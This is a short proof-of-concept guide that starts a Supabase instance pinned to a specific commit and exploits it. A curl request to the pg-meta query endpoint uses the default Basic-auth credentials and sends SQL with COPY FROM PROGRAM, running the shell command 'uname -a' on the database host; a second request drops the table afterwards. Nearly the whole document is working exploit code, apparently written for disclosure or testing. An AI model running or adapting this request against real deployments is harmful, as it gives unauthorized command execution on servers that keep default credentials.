# Start Vulnerable instance
```bash
git clone https://github.com/supabase/supabase
pushd supabase
git checkout d83ef08ea1aa661ead1af970a094c512319863f8
popd
mkdir supabase-project
cp -rf supabase/docker/* supabase-project
cp supabase/docker/.env.example supabase-project/.env
cd supabase-project
docker compose pull
docker compose up 
```

# Access the exposed UI
Open your browser and navigate to `http://localhost:3000` to access the Supabase UI.
# Use the following command to run the exploit
```bash
curl 'http://127.0.0.1:8000/api/platform/pg-meta/default/query?key=' \
  -X POST \
  -H 'content-type: application/json' \
  -H 'x-connection-encrypted: ' \
  -H 'Authorization: Basic c3VwYWJhc2U6dGhpc19wYXNzd29yZF9pc19pbnNlY3VyZV9hbmRfc2hvdWxkX2JlX3VwZGF0ZWQ=' \
  --data-raw $'{"query":"CREATE TABLE filelist (filename text);\\nCOPY filelist FROM PROGRAM \'uname -a\';\\nSELECT * FROM filelist;","disable_statement_timeout":true}'

# cleanup
curl 'http://127.0.0.1:8000/api/platform/pg-meta/default/query?key=' \
  -X POST \
  -H 'content-type: application/json' \
  -H 'x-connection-encrypted: ' \
  -H 'Authorization: Basic c3VwYWJhc2U6dGhpc19wYXNzd29yZF9pc19pbnNlY3VyZV9hbmRfc2hvdWxkX2JlX3VwZGF0ZWQ=' \
  --data-raw $'{"query":"drop table filelist","disable_statement_timeout":true}'
```